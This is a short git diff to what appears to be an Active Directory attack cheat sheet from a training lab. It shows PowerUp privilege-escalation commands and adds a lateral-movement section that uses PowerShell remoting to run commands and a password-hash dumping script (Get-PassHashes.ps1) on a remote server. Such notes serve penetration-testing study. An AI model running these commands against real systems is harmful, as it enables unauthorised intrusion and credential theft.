@@ -186,3 +186,11 @@ Invoke-ServiceAbuse -Name 'software_xxx' -UserName 'corporate\student01' #Let's 
 ```
 Invoke-Privesc                                        #Performs all checks
 ```
+
+# Lateral Movement
+
+- **Powershell Remoting:**
+```
+Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName xxxx.corporate.corp.local          #Execute whoami & hostname commands on the indicated server
+Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName xxxx.corporate.corp.local #Execute the script Git-PassHashes.ps1 on the indicated server
+```
